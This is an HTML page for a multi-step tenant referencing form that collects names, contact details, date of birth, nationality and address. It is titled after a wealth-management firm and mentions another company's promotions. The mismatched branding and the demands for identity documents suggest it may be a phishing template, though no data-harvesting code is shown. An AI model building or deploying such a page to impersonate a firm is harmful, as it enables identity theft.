<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>St James’s Place | Wealth Management</title>

    <!-- CSS dependencies -->
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65"
      crossorigin="anonymous"
    />

    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/fontawesome.min.css"
      integrity="sha384-QYIZto+st3yW+o8+5OHfT6S482Zsvz2WfOzpFSXMF9zqeLcFV0/wlZpMtyFcZALm"
      crossorigin="anonymous"
    />
    <link
      href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="./assets/css/global.css" />
    <link rel="icon" href="./assets/images/logo.svg" type="image/png" />

    <!-- JS dependencies -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
    <script
      src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
      integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"
      integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
      crossorigin="anonymous"
    ></script>
  </head>
  <body>
    <div id="root">
      <div class="container overflow-hidden">
        <div class="logo">
          <img src="./assets/images/logo.svg" alt="" />
        </div>
        <form action="void:javascript" method="post">
          <div class="form-container custom-width height-1">
            <div id="form-contents" class="width-4">
              <h1>
                <span class="form-one-title">Tenant Referencing Form</span>
              </h1>
              <p class="address-text">
                141 Heartland Road, London <br />
                SW15 8BH
              </p>
              <div class="form-terms">
                <ul>
                  <li class="req-title">Requirements to complete the form:</li>
                  <li class="bullet">
                    Must have access to identity documents ready for uploading.
                  </li>
                  <li class="bullet">Have access to an email address</li>
                  <li class="bullet">Have a bank account in your name</li>
                  <li class="bullet">
                    You must have lived in the UK for longer than 12 months
                  </li>
                  <li class="bullet">Be a current UK resident</li>
                  <li class="bullet">Be over 18</li>
                </ul>
              </div>
              <button
                type="button"
                id="submit-primary"
                class="btn custom-primary"
              >
                Apply Now
              </button>
              <hr class="hr" />
              <p class="muted-text">To complete a joint application</p>
              <button
                type="button"
                id="submit-secondary"
                class="btn outlined-btn"
              >
                Apply Now
              </button>
            </div>

            <div id="form-contents-2" class="width-4">
              <h1><span class="form-two-title">Personal details</span></h1>
              <div class="form-items">
                <div class="form-group">
                  <label for="fname" class="fname-label">Frist Name</label>
                  <input
                    type="text"
                    class="form-control input-text fname"
                    id="fname"
                    name="fname"
                    placeholder="e.g. John"
                  />
                  <span class="error" id="error-fname"></span>
                </div>
                <div class="form-group">
                  <label for="lname" class="m-15">Last Name</label>
                  <input
                    type="text"
                    class="form-control input-text lname"
                    id="lname"
                    name="lname"
                    placeholder="e.g. Smith"
                    aria-describedby="legal-name"
                  />
                  <small id="legal-name" class="m-15"
                    >Enter your full legal name. This must match the one on your
                    ID documents</small
                  >
                  <span class="error" id="error-lname"></span>
                </div>
                <div class="form-group">
                  <label for="first_name" class="m-15">Email address</label>
                  <input
                    type="email"
                    class="form-control input-text email"
                    id="email"
                    name="email"
                    placeholder="Enter here"
                    aria-describedby="emailDescribe"
                  />
                  <small class="m-15" id="emailDescribe"
                    >Enter your email address. We'll use this to send you
                    important account information</small
                  >
                  <span class="error" id="error-email"></span>
                </div>
                <div class="form-group">
                  <label for="phone" class="m-15">Telephone number</label>
                  <input
                    type="text"
                    class="form-control input-text phone"
                    id="phone"
                    name="phone"
                    placeholder="Enter here"
                    aria-describedby="tel"
                  />
                  <small class="m-15" id="tel"
                    >Enter your telephone number and we'll use that as your
                    primary contact number</small
                  >
                  <span class="error" id="error-tel"></span>
                </div>
                <div class="form-group check-group">
                  <input
                    type="checkbox"
                    value="email-updates"
                    id="email-updates"
                    class="checkbox"
                  />
                  <label class="m-15" for="email-updates"
                    >Email me updates about relevant Tandem promotions and
                    products</label
                  >
                  <span class="error" id="error-check-one"></span>
                </div>
                <hr class="form-two--hr" />
                <div class="form-group check-group">
                  <input
                    type="checkbox"
                    value="agree"
                    id="agree"
                    class="checkbox"
                  />
                  <label class="m-15" for="agree"
                    >I have read and agree to the digital terms and privacy
                    policy</label
                  >
                  <span class="error" id="error-check-2"></span>
                </div>
                <div class="form-submit">
                  <button
                    type="button"
                    id="second-next"
                    id="second-submit"
                    class="next-btn"
                  >
                    Next
                  </button>
                </div>
              </div>
            </div>

            <div id="form-contents-3" class="width-4">
              <h1><span class="form-two-title mt-none">About you</span></h1>
              <p class="sub-title text-center">
                We use these details to verify your identity
              </p>
              <div class="form-items">
                <div class="form-group">
                  <label for="startDate">Date of birth</label>
                  <div class="input-group date" id="datepicker">
                    <input
                      type="date"
                      class="form-control input-text"
                      id="startDate"
                    />
                  </div>
                  <span class="error" id="error-date"></span>
                </div>
                <div class="form-group">
                  <label for="Nationality" class="m-15">Nationality</label>
                  <select
                    class="input-text w-100 select-field"
                    id="Nationality"
                  >
                    <option value="select" selected>
                      Select a Nationality
                    </option>
                    <option value="Afghanistan">Afghanistan</option>
                    <option value="Albania">Albania</option>
                    <option value="Algeria">Algeria</option>
                    <option value="American Samoa">American Samoa</option>
                    <option value="Andorra">Andorra</option>
                    <option value="Angola">Angola</option>
                    <option value="Anguilla">Anguilla</option>
                    <option value="Antartica">Antarctica</option>
                    <option value="Antigua and Barbuda">
                      Antigua and Barbuda
                    </option>
                    <option value="Argentina">Argentina</option>
                    <option value="Armenia">Armenia</option>
                    <option value="Aruba">Aruba</option>
                    <option value="Australia">Australia</option>
                    <option value="Austria">Austria</option>
                    <option value="Azerbaijan">Azerbaijan</option>
                    <option value="Bahamas">Bahamas</option>
                    <option value="Bahrain">Bahrain</option>
                    <option value="Bangladesh">Bangladesh</option>
                    <option value="Barbados">Barbados</option>
                    <option value="Belarus">Belarus</option>
                    <option value="Belgium">Belgium</option>
                    <option value="Belize">Belize</option>
                    <option value="Benin">Benin</option>
                    <option value="Bermuda">Bermuda</option>
                    <option value="Bhutan">Bhutan</option>
                    <option value="Bolivia">Bolivia</option>
                    <option value="Bosnia and Herzegowina">
                      Bosnia and Herzegowina
                    </option>
                    <option value="Botswana">Botswana</option>
                    <option value="Bouvet Island">Bouvet Island</option>
                    <option value="Brazil">Brazil</option>
                    <option value="British Indian Ocean Territory">
                      British Indian Ocean Territory
                    </option>
                    <option value="Brunei Darussalam">Brunei Darussalam</option>
                    <option value="Bulgaria">Bulgaria</option>
                    <option value="Burkina Faso">Burkina Faso</option>
                    <option value="Burundi">Burundi</option>
                    <option value="Cambodia">Cambodia</option>
                    <option value="Cameroon">Cameroon</option>
                    <option value="Canada">Canada</option>
                    <option value="Cape Verde">Cape Verde</option>
                    <option value="Cayman Islands">Cayman Islands</option>
                    <option value="Central African Republic">
                      Central African Republic
                    </option>
                    <option value="Chad">Chad</option>
                    <option value="Chile">Chile</option>
                    <option value="China">China</option>
                    <option value="Christmas Island">Christmas Island</option>
                    <option value="Cocos Islands">
                      Cocos (Keeling) Islands
                    </option>
                    <option value="Colombia">Colombia</option>
                    <option value="Comoros">Comoros</option>
                    <option value="Congo">Congo</option>
                    <option value="Congo">
                      Congo, the Democratic Republic of the
                    </option>
                    <option value="Cook Islands">Cook Islands</option>
                    <option value="Costa Rica">Costa Rica</option>
                    <option value="Cota D'Ivoire">Cote d'Ivoire</option>
                    <option value="Croatia">Croatia (Hrvatska)</option>
                    <option value="Cuba">Cuba</option>
                    <option value="Cyprus">Cyprus</option>
                    <option value="Czech Republic">Czech Republic</option>
                    <option value="Denmark">Denmark</option>
                    <option value="Djibouti">Djibouti</option>
                    <option value="Dominica">Dominica</option>
                    <option value="Dominican Republic">
                      Dominican Republic
                    </option>
                    <option value="East Timor">East Timor</option>
                    <option value="Ecuador">Ecuador</option>
                    <option value="Egypt">Egypt</option>
                    <option value="El Salvador">El Salvador</option>
                    <option value="Equatorial Guinea">Equatorial Guinea</option>
                    <option value="Eritrea">Eritrea</option>
                    <option value="Estonia">Estonia</option>
                    <option value="Ethiopia">Ethiopia</option>
                    <option value="Falkland Islands">
                      Falkland Islands (Malvinas)
                    </option>
                    <option value="Faroe Islands">Faroe Islands</option>
                    <option value="Fiji">Fiji</option>
                    <option value="Finland">Finland</option>
                    <option value="France">France</option>
                    <option value="France Metropolitan">
                      France, Metropolitan
                    </option>
                    <option value="French Guiana">French Guiana</option>
                    <option value="French Polynesia">French Polynesia</option>
                    <option value="French Southern Territories">
                      French Southern Territories
                    </option>
                    <option value="Gabon">Gabon</option>
                    <option value="Gambia">Gambia</option>
                    <option value="Georgia">Georgia</option>
                    <option value="Germany">Germany</option>
                    <option value="Ghana">Ghana</option>
                    <option value="Gibraltar">Gibraltar</option>
                    <option value="Greece">Greece</option>
                    <option value="Greenland">Greenland</option>
                    <option value="Grenada">Grenada</option>
                    <option value="Guadeloupe">Guadeloupe</option>
                    <option value="Guam">Guam</option>
                    <option value="Guatemala">Guatemala</option>
                    <option value="Guinea">Guinea</option>
                    <option value="Guinea-Bissau">Guinea-Bissau</option>
                    <option value="Guyana">Guyana</option>
                    <option value="Haiti">Haiti</option>
                    <option value="Heard and McDonald Islands">
                      Heard and Mc Donald Islands
                    </option>
                    <option value="Holy See">
                      Holy See (Vatican City State)
                    </option>
                    <option value="Honduras">Honduras</option>
                    <option value="Hong Kong">Hong Kong</option>
                    <option value="Hungary">Hungary</option>
                    <option value="Iceland">Iceland</option>
                    <option value="India">India</option>
                    <option value="Indonesia">Indonesia</option>
                    <option value="Iran">Iran (Islamic Republic of)</option>
                    <option value="Iraq">Iraq</option>
                    <option value="Ireland">Ireland</option>
                    <option value="Israel">Israel</option>
                    <option value="Italy">Italy</option>
                    <option value="Jamaica">Jamaica</option>
                    <option value="Japan">Japan</option>
                    <option value="Jordan">Jordan</option>
                    <option value="Kazakhstan">Kazakhstan</option>
                    <option value="Kenya">Kenya</option>
                    <option value="Kiribati">Kiribati</option>
                    <option value="Democratic People's Republic of Korea">
                      Korea, Democratic People's Republic of
                    </option>
                    <option value="Korea">Korea, Republic of</option>
                    <option value="Kuwait">Kuwait</option>
                    <option value="Kyrgyzstan">Kyrgyzstan</option>
                    <option value="Lao">
                      Lao People's Democratic Republic
                    </option>
                    <option value="Latvia">Latvia</option>
                    <option value="Lebanon">Lebanon</option>
                    <option value="Lesotho">Lesotho</option>
                    <option value="Liberia">Liberia</option>
                    <option value="Libyan Arab Jamahiriya">
                      Libyan Arab Jamahiriya
                    </option>
                    <option value="Liechtenstein">Liechtenstein</option>
                    <option value="Lithuania">Lithuania</option>
                    <option value="Luxembourg">Luxembourg</option>
                    <option value="Macau">Macau</option>
                    <option value="Macedonia">
                      Macedonia, The Former Yugoslav Republic of
                    </option>
                    <option value="Madagascar">Madagascar</option>
                    <option value="Malawi">Malawi</option>
                    <option value="Malaysia">Malaysia</option>
                    <option value="Maldives">Maldives</option>
                    <option value="Mali">Mali</option>
                    <option value="Malta">Malta</option>
                    <option value="Marshall Islands">Marshall Islands</option>
                    <option value="Martinique">Martinique</option>
                    <option value="Mauritania">Mauritania</option>
                    <option value="Mauritius">Mauritius</option>
                    <option value="Mayotte">Mayotte</option>
                    <option value="Mexico">Mexico</option>
                    <option value="Micronesia">
                      Micronesia, Federated States of
                    </option>
                    <option value="Moldova">Moldova, Republic of</option>
                    <option value="Monaco">Monaco</option>
                    <option value="Mongolia">Mongolia</option>
                    <option value="Montserrat">Montserrat</option>
                    <option value="Morocco">Morocco</option>
                    <option value="Mozambique">Mozambique</option>
                    <option value="Myanmar">Myanmar</option>
                    <option value="Namibia">Namibia</option>
                    <option value="Nauru">Nauru</option>
                    <option value="Nepal">Nepal</option>
                    <option value="Netherlands">Netherlands</option>
                    <option value="Netherlands Antilles">
                      Netherlands Antilles
                    </option>
                    <option value="New Caledonia">New Caledonia</option>
                    <option value="New Zealand">New Zealand</option>
                    <option value="Nicaragua">Nicaragua</option>
                    <option value="Niger">Niger</option>
                    <option value="Nigeria">Nigeria</option>
                    <option value="Niue">Niue</option>
                    <option value="Norfolk Island">Norfolk Island</option>
                    <option value="Northern Mariana Islands">
                      Northern Mariana Islands
                    </option>
                    <option value="Norway">Norway</option>
                    <option value="Oman">Oman</option>
                    <option value="Pakistan">Pakistan</option>
                    <option value="Palau">Palau</option>
                    <option value="Panama">Panama</option>
                    <option value="Papua New Guinea">Papua New Guinea</option>
                    <option value="Paraguay">Paraguay</option>
                    <option value="Peru">Peru</option>
                    <option value="Philippines">Philippines</option>
                    <option value="Pitcairn">Pitcairn</option>
                    <option value="Poland">Poland</option>
                    <option value="Portugal">Portugal</option>
                    <option value="Puerto Rico">Puerto Rico</option>
                    <option value="Qatar">Qatar</option>
                    <option value="Reunion">Reunion</option>
                    <option value="Romania">Romania</option>
                    <option value="Russia">Russian Federation</option>
                    <option value="Rwanda">Rwanda</option>
                    <option value="Saint Kitts and Nevis">
                      Saint Kitts and Nevis
                    </option>
                    <option value="Saint LUCIA">Saint LUCIA</option>
                    <option value="Saint Vincent">
                      Saint Vincent and the Grenadines
                    </option>
                    <option value="Samoa">Samoa</option>
                    <option value="San Marino">San Marino</option>
                    <option value="Sao Tome and Principe">
                      Sao Tome and Principe
                    </option>
                    <option value="Saudi Arabia">Saudi Arabia</option>
                    <option value="Senegal">Senegal</option>
                    <option value="Seychelles">Seychelles</option>
                    <option value="Sierra">Sierra Leone</option>
                    <option value="Singapore">Singapore</option>
                    <option value="Slovakia">Slovakia (Slovak Republic)</option>
                    <option value="Slovenia">Slovenia</option>
                    <option value="Solomon Islands">Solomon Islands</option>
                    <option value="Somalia">Somalia</option>
                    <option value="South Africa">South Africa</option>
                    <option value="South Georgia">
                      South Georgia and the South Sandwich Islands
                    </option>
                    <option value="Span">Spain</option>
                    <option value="SriLanka">Sri Lanka</option>
                    <option value="St. Helena">St. Helena</option>
                    <option value="St. Pierre and Miguelon">
                      St. Pierre and Miquelon
                    </option>
                    <option value="Sudan">Sudan</option>
                    <option value="Suriname">Suriname</option>
                    <option value="Svalbard">
                      Svalbard and Jan Mayen Islands
                    </option>
                    <option value="Swaziland">Swaziland</option>
                    <option value="Sweden">Sweden</option>
                    <option value="Switzerland">Switzerland</option>
                    <option value="Syria">Syrian Arab Republic</option>
                    <option value="Taiwan">Taiwan, Province of China</option>
                    <option value="Tajikistan">Tajikistan</option>
                    <option value="Tanzania">
                      Tanzania, United Republic of
                    </option>
                    <option value="Thailand">Thailand</option>
                    <option value="Togo">Togo</option>
                    <option value="Tokelau">Tokelau</option>
                    <option value="Tonga">Tonga</option>
                    <option value="Trinidad and Tobago">
                      Trinidad and Tobago
                    </option>
                    <option value="Tunisia">Tunisia</option>
                    <option value="Turkey">Turkey</option>
                    <option value="Turkmenistan">Turkmenistan</option>
                    <option value="Turks and Caicos">
                      Turks and Caicos Islands
                    </option>
                    <option value="Tuvalu">Tuvalu</option>
                    <option value="Uganda">Uganda</option>
                    <option value="Ukraine">Ukraine</option>
                    <option value="United Arab Emirates">
                      United Arab Emirates
                    </option>
                    <option value="United Kingdom">United Kingdom</option>
                    <option value="United States">United States</option>
                    <option value="United States Minor Outlying Islands">
                      United States Minor Outlying Islands
                    </option>
                    <option value="Uruguay">Uruguay</option>
                    <option value="Uzbekistan">Uzbekistan</option>
                    <option value="Vanuatu">Vanuatu</option>
                    <option value="Venezuela">Venezuela</option>
                    <option value="Vietnam">Viet Nam</option>
                    <option value="Virgin Islands (British)">
                      Virgin Islands (British)
                    </option>
                    <option value="Virgin Islands (U.S)">
                      Virgin Islands (U.S.)
                    </option>
                    <option value="Wallis and Futana Islands">
                      Wallis and Futuna Islands
                    </option>
                    <option value="Western Sahara">Western Sahara</option>
                    <option value="Yemen">Yemen</option>
                    <option value="Serbia">Serbia</option>
                    <option value="Zambia">Zambia</option>
                    <option value="Zimbabwe">Zimbabwe</option>
                  </select>
                  <span class="error" id="error-nationality"></span>
                </div>
                <div class="form-group">
                  <label for="country-of-birth" class="m-15"
                    >Country of Birth</label
                  >
                  <select
                    class="input-text w-100 select-field"
                    id="country-of-birth"
                  >
                    <option value="select" selected>Select a Country</option>
                    <option value="Afghanistan">Afghanistan</option>
                    <option value="Albania">Albania</option>
                    <option value="Algeria">Algeria</option>
                    <option value="American Samoa">American Samoa</option>
                    <option value="Andorra">Andorra</option>
                    <option value="Angola">Angola</option>
                    <option value="Anguilla">Anguilla</option>
                    <option value="Antartica">Antarctica</option>
                    <option value="Antigua and Barbuda">
                      Antigua and Barbuda
                    </option>
                    <option value="Argentina">Argentina</option>
                    <option value="Armenia">Armenia</option>
                    <option value="Aruba">Aruba</option>
                    <option value="Australia">Australia</option>
                    <option value="Austria">Austria</option>
                    <option value="Azerbaijan">Azerbaijan</option>
                    <option value="Bahamas">Bahamas</option>
                    <option value="Bahrain">Bahrain</option>
                    <option value="Bangladesh">Bangladesh</option>
                    <option value="Barbados">Barbados</option>
                    <option value="Belarus">Belarus</option>
                    <option value="Belgium">Belgium</option>
                    <option value="Belize">Belize</option>
                    <option value="Benin">Benin</option>
                    <option value="Bermuda">Bermuda</option>
                    <option value="Bhutan">Bhutan</option>
                    <option value="Bolivia">Bolivia</option>
                    <option value="Bosnia and Herzegowina">
                      Bosnia and Herzegowina
                    </option>
                    <option value="Botswana">Botswana</option>
                    <option value="Bouvet Island">Bouvet Island</option>
                    <option value="Brazil">Brazil</option>
                    <option value="British Indian Ocean Territory">
                      British Indian Ocean Territory
                    </option>
                    <option value="Brunei Darussalam">Brunei Darussalam</option>
                    <option value="Bulgaria">Bulgaria</option>
                    <option value="Burkina Faso">Burkina Faso</option>
                    <option value="Burundi">Burundi</option>
                    <option value="Cambodia">Cambodia</option>
                    <option value="Cameroon">Cameroon</option>
                    <option value="Canada">Canada</option>
                    <option value="Cape Verde">Cape Verde</option>
                    <option value="Cayman Islands">Cayman Islands</option>
                    <option value="Central African Republic">
                      Central African Republic
                    </option>
                    <option value="Chad">Chad</option>
                    <option value="Chile">Chile</option>
                    <option value="China">China</option>
                    <option value="Christmas Island">Christmas Island</option>
                    <option value="Cocos Islands">
                      Cocos (Keeling) Islands
                    </option>
                    <option value="Colombia">Colombia</option>
                    <option value="Comoros">Comoros</option>
                    <option value="Congo">Congo</option>
                    <option value="Congo">
                      Congo, the Democratic Republic of the
                    </option>
                    <option value="Cook Islands">Cook Islands</option>
                    <option value="Costa Rica">Costa Rica</option>
                    <option value="Cota D'Ivoire">Cote d'Ivoire</option>
                    <option value="Croatia">Croatia (Hrvatska)</option>
                    <option value="Cuba">Cuba</option>
                    <option value="Cyprus">Cyprus</option>
                    <option value="Czech Republic">Czech Republic</option>
                    <option value="Denmark">Denmark</option>
                    <option value="Djibouti">Djibouti</option>
                    <option value="Dominica">Dominica</option>
                    <option value="Dominican Republic">
                      Dominican Republic
                    </option>
                    <option value="East Timor">East Timor</option>
                    <option value="Ecuador">Ecuador</option>
                    <option value="Egypt">Egypt</option>
                    <option value="El Salvador">El Salvador</option>
                    <option value="Equatorial Guinea">Equatorial Guinea</option>
                    <option value="Eritrea">Eritrea</option>
                    <option value="Estonia">Estonia</option>
                    <option value="Ethiopia">Ethiopia</option>
                    <option value="Falkland Islands">
                      Falkland Islands (Malvinas)
                    </option>
                    <option value="Faroe Islands">Faroe Islands</option>
                    <option value="Fiji">Fiji</option>
                    <option value="Finland">Finland</option>
                    <option value="France">France</option>
                    <option value="France Metropolitan">
                      France, Metropolitan
                    </option>
                    <option value="French Guiana">French Guiana</option>
                    <option value="French Polynesia">French Polynesia</option>
                    <option value="French Southern Territories">
                      French Southern Territories
                    </option>
                    <option value="Gabon">Gabon</option>
                    <option value="Gambia">Gambia</option>
                    <option value="Georgia">Georgia</option>
                    <option value="Germany">Germany</option>
                    <option value="Ghana">Ghana</option>
                    <option value="Gibraltar">Gibraltar</option>
                    <option value="Greece">Greece</option>
                    <option value="Greenland">Greenland</option>
                    <option value="Grenada">Grenada</option>
                    <option value="Guadeloupe">Guadeloupe</option>
                    <option value="Guam">Guam</option>
                    <option value="Guatemala">Guatemala</option>
                    <option value="Guinea">Guinea</option>
                    <option value="Guinea-Bissau">Guinea-Bissau</option>
                    <option value="Guyana">Guyana</option>
                    <option value="Haiti">Haiti</option>
                    <option value="Heard and McDonald Islands">
                      Heard and Mc Donald Islands
                    </option>
                    <option value="Holy See">
                      Holy See (Vatican City State)
                    </option>
                    <option value="Honduras">Honduras</option>
                    <option value="Hong Kong">Hong Kong</option>
                    <option value="Hungary">Hungary</option>
                    <option value="Iceland">Iceland</option>
                    <option value="India">India</option>
                    <option value="Indonesia">Indonesia</option>
                    <option value="Iran">Iran (Islamic Republic of)</option>
                    <option value="Iraq">Iraq</option>
                    <option value="Ireland">Ireland</option>
                    <option value="Israel">Israel</option>
                    <option value="Italy">Italy</option>
                    <option value="Jamaica">Jamaica</option>
                    <option value="Japan">Japan</option>
                    <option value="Jordan">Jordan</option>
                    <option value="Kazakhstan">Kazakhstan</option>
                    <option value="Kenya">Kenya</option>
                    <option value="Kiribati">Kiribati</option>
                    <option value="Democratic People's Republic of Korea">
                      Korea, Democratic People's Republic of
                    </option>
                    <option value="Korea">Korea, Republic of</option>
                    <option value="Kuwait">Kuwait</option>
                    <option value="Kyrgyzstan">Kyrgyzstan</option>
                    <option value="Lao">
                      Lao People's Democratic Republic
                    </option>
                    <option value="Latvia">Latvia</option>
                    <option value="Lebanon">Lebanon</option>
                    <option value="Lesotho">Lesotho</option>
                    <option value="Liberia">Liberia</option>
                    <option value="Libyan Arab Jamahiriya">
                      Libyan Arab Jamahiriya
                    </option>
                    <option value="Liechtenstein">Liechtenstein</option>
                    <option value="Lithuania">Lithuania</option>
                    <option value="Luxembourg">Luxembourg</option>
                    <option value="Macau">Macau</option>
                    <option value="Macedonia">
                      Macedonia, The Former Yugoslav Republic of
                    </option>
                    <option value="Madagascar">Madagascar</option>
                    <option value="Malawi">Malawi</option>
                    <option value="Malaysia">Malaysia</option>
                    <option value="Maldives">Maldives</option>
                    <option value="Mali">Mali</option>
                    <option value="Malta">Malta</option>
                    <option value="Marshall Islands">Marshall Islands</option>
                    <option value="Martinique">Martinique</option>
                    <option value="Mauritania">Mauritania</option>
                    <option value="Mauritius">Mauritius</option>
                    <option value="Mayotte">Mayotte</option>
                    <option value="Mexico">Mexico</option>
                    <option value="Micronesia">
                      Micronesia, Federated States of
                    </option>
                    <option value="Moldova">Moldova, Republic of</option>
                    <option value="Monaco">Monaco</option>
                    <option value="Mongolia">Mongolia</option>
                    <option value="Montserrat">Montserrat</option>
                    <option value="Morocco">Morocco</option>
                    <option value="Mozambique">Mozambique</option>
                    <option value="Myanmar">Myanmar</option>
                    <option value="Namibia">Namibia</option>
                    <option value="Nauru">Nauru</option>
                    <option value="Nepal">Nepal</option>
                    <option value="Netherlands">Netherlands</option>
                    <option value="Netherlands Antilles">
                      Netherlands Antilles
                    </option>
                    <option value="New Caledonia">New Caledonia</option>
                    <option value="New Zealand">New Zealand</option>
                    <option value="Nicaragua">Nicaragua</option>
                    <option value="Niger">Niger</option>
                    <option value="Nigeria">Nigeria</option>
                    <option value="Niue">Niue</option>
                    <option value="Norfolk Island">Norfolk Island</option>
                    <option value="Northern Mariana Islands">
                      Northern Mariana Islands
                    </option>
                    <option value="Norway">Norway</option>
                    <option value="Oman">Oman</option>
                    <option value="Pakistan">Pakistan</option>
                    <option value="Palau">Palau</option>
                    <option value="Panama">Panama</option>
                    <option value="Papua New Guinea">Papua New Guinea</option>
                    <option value="Paraguay">Paraguay</option>
                    <option value="Peru">Peru</option>
                    <option value="Philippines">Philippines</option>
                    <option value="Pitcairn">Pitcairn</option>
                    <option value="Poland">Poland</option>
                    <option value="Portugal">Portugal</option>
                    <option value="Puerto Rico">Puerto Rico</option>
                    <option value="Qatar">Qatar</option>
                    <option value="Reunion">Reunion</option>
                    <option value="Romania">Romania</option>
                    <option value="Russia">Russian Federation</option>
                    <option value="Rwanda">Rwanda</option>
                    <option value="Saint Kitts and Nevis">
                      Saint Kitts and Nevis
                    </option>
                    <option value="Saint LUCIA">Saint LUCIA</option>
                    <option value="Saint Vincent">
                      Saint Vincent and the Grenadines
                    </option>
                    <option value="Samoa">Samoa</option>
                    <option value="San Marino">San Marino</option>
                    <option value="Sao Tome and Principe">
                      Sao Tome and Principe
                    </option>
                    <option value="Saudi Arabia">Saudi Arabia</option>
                    <option value="Senegal">Senegal</option>
                    <option value="Seychelles">Seychelles</option>
                    <option value="Sierra">Sierra Leone</option>
                    <option value="Singapore">Singapore</option>
                    <option value="Slovakia">Slovakia (Slovak Republic)</option>
                    <option value="Slovenia">Slovenia</option>
                    <option value="Solomon Islands">Solomon Islands</option>
                    <option value="Somalia">Somalia</option>
                    <option value="South Africa">South Africa</option>
                    <option value="South Georgia">
                      South Georgia and the South Sandwich Islands
                    </option>
                    <option value="Span">Spain</option>
                    <option value="SriLanka">Sri Lanka</option>
                    <option value="St. Helena">St. Helena</option>
                    <option value="St. Pierre and Miguelon">
                      St. Pierre and Miquelon
                    </option>
                    <option value="Sudan">Sudan</option>
                    <option value="Suriname">Suriname</option>
                    <option value="Svalbard">
                      Svalbard and Jan Mayen Islands
                    </option>
                    <option value="Swaziland">Swaziland</option>
                    <option value="Sweden">Sweden</option>
                    <option value="Switzerland">Switzerland</option>
                    <option value="Syria">Syrian Arab Republic</option>
                    <option value="Taiwan">Taiwan, Province of China</option>
                    <option value="Tajikistan">Tajikistan</option>
                    <option value="Tanzania">
                      Tanzania, United Republic of
                    </option>
                    <option value="Thailand">Thailand</option>
                    <option value="Togo">Togo</option>
                    <option value="Tokelau">Tokelau</option>
                    <option value="Tonga">Tonga</option>
                    <option value="Trinidad and Tobago">
                      Trinidad and Tobago
                    </option>
                    <option value="Tunisia">Tunisia</option>
                    <option value="Turkey">Turkey</option>
                    <option value="Turkmenistan">Turkmenistan</option>
                    <option value="Turks and Caicos">
                      Turks and Caicos Islands
                    </option>
                    <option value="Tuvalu">Tuvalu</option>
                    <option value="Uganda">Uganda</option>
                    <option value="Ukraine">Ukraine</option>
                    <option value="United Arab Emirates">
                      United Arab Emirates
                    </option>
                    <option value="United Kingdom">United Kingdom</option>
                    <option value="United States">United States</option>
                    <option value="United States Minor Outlying Islands">
                      United States Minor Outlying Islands
                    </option>
                    <option value="Uruguay">Uruguay</option>
                    <option value="Uzbekistan">Uzbekistan</option>
                    <option value="Vanuatu">Vanuatu</option>
                    <option value="Venezuela">Venezuela</option>
                    <option value="Vietnam">Viet Nam</option>
                    <option value="Virgin Islands (British)">
                      Virgin Islands (British)
                    </option>
                    <option value="Virgin Islands (U.S)">
                      Virgin Islands (U.S.)
                    </option>
                    <option value="Wallis and Futana Islands">
                      Wallis and Futuna Islands
                    </option>
                    <option value="Western Sahara">Western Sahara</option>
                    <option value="Yemen">Yemen</option>
                    <option value="Serbia">Serbia</option>
                    <option value="Zambia">Zambia</option>
                    <option value="Zimbabwe">Zimbabwe</option>
                  </select>
                  <span class="error" id="error-birth-country"></span>
                </div>
                <h2><span class="form-two-title">Your address</span></h2>
                <p class="sub-title">Enter your address manually</p>
                <div class="form-group">
                  <label for="flat" class="m-15">Flat number</label>
                  <input
                    type="text"
                    class="form-control input-text flat"
                    id="flat"
                    name="flat"
                    placeholder="Enter here"
                  />
                  <span class="error" id="error-flat"></span>
                </div>
                <div class="form-group">
                  <label for="building" class="m-15">Building number</label>
                  <input
                    type="text"
                    class="form-control input-text building"
                    id="building"
                    name="building"
                    placeholder="Enter here"
                  />
                  <span class="error" id="error-building"></span>
                </div>
                <div class="form-group">
                  <!-- <label for="street" class="m-15">Building Number</label> -->
                  <label for="street" class="m-15">Street</label>
                  <input
                    type="text"
                    class="form-control input-text street"
                    id="street"
                    name="street"
                    placeholder="Enter here"
                  />
                  <span class="error" id="error-street"></span>
                </div>
                <div class="form-group">
                  <label for="city" class="m-15">City</label>
                  <input
                    type="text"
                    class="form-control input-text city"
                    id="city"
                    name="city"
                    placeholder="Enter here"
                  />
                  <span class="error" id="error-city"></span>
                </div>
                <div class="form-group">
                  <label for="country" class="m-15">Country (Optional)</label>
                  <input
                    type="text"
                    class="form-control input-text country"
                    id="country"
                    name="country"
                    placeholder="Enter here"
                  />
                  <!-- <input
                          type="text"
                          class="form-control input-text country"
                          id="country-2"
                          name="country-2"
                          placeholder="Enter here"
                        /> -->
                  <span class="error" id="error-country"></span>
                </div>
                <div class="form-group">
                  <label for="postcode" class="m-15">Postcode</label>
                  <input
                    type="text"
                    class="form-control input-text postcode"
                    id="postcode"
                    name="postcode"
                    placeholder="Enter here"
                  />
                  <span class="error" id="error-postcode"></span>
                </div>
                <div class="form-group">
                  <label for="Residential-status" class="m-15"
                    >Residential Status</label
                  >
                  <select
                    class="input-text w-100 select-field"
                    id="Residential-status"
                  >
                    <option value="select">Select a status</option>
                    <option value="Homeowner (Mortgage)">
                      Homeowner (Mortgage)
                    </option>
                    <option value="Homeowner (No Mortgage)">
                      Homeowner (No Mortgage)
                    </option>
                    <option value="Tenant">Tenant</option>
                    <option value="Living with family">
                      Living with family
                    </option>
                    <option value="Other">Other</option>
                  </select>
                  <span class="error" id="error-residential"></span>
                </div>
